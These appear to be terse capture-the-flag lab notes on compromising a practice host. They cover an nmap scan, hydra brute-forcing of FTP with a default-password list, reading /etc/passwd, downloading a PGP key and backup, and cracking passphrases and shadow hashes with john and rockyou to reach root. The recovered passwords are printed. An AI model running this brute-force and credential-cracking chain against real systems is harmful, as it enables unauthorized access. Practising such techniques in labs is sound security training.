```bash
nmap -sV -Pn 0.0.0.0
```

![[Captura desde 2024-09-03 11-31-30.png]]

```bash
sudo hydra -C ftp-betterdefaultpasslist.txt ftp://0.0.0.0
```

```bash
sudo hydra -C ftp-betterdefaultpasslist.txt -t 16 -f -V ftp://0.0.0.0
```

![[Captura desde 2024-09-03 11-41-29.png]]

Username: `ftp`
Password: `b1uRR3`

commands for ftp server
https://www.cs.colostate.edu/helpdocs/ftp.html

tool for connecting ftp with `bash` like commands
https://www.ncftp.com/download/

```bash
./ncftp 0.0.0.0 -u ftp -p b1uRR3
```

https://www.ncftp.com/ncftp/doc/ncftp.html

![[Captura desde 2024-09-03 12-11-46.png]]

```bash
cat /etc/passwd
```

![[Captura desde 2024-09-03 12-19-16.png]]

ssh username `melodias`

![[Captura desde 2024-09-03 13-36-47.png]]

```bash
cat private.asc
```

![[Captura desde 2024-09-03 15-08-18.png]]

```bash
get private.asc
get backup.pgp
```

`john` for cracking secret key

```bash
gpg2john private.asc > private.hash
john private.hash
```

![[Captura desde 2024-09-03 15-06-01.png]]

Key: `xbox360`

![[Captura desde 2024-09-03 17-46-28.png]]

![[Captura desde 2024-09-03 17-47-51.png]]

connecting to ftp server and download `passwd`

```bash
cd etc/
mget passwd
```

![[Captura desde 2024-09-03 18-10-38.png]]

![[Captura desde 2024-09-03 18-14-36.png]]

```bash
gpg --decrypt backup.pgp > user_hash
unshadow passwd user_hash > ssh_hash
john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Captura desde 2024-09-03 18-17-00.png]]

Username `root`
Password `hikari`

![[Captura desde 2024-09-03 18-31-04.png]]
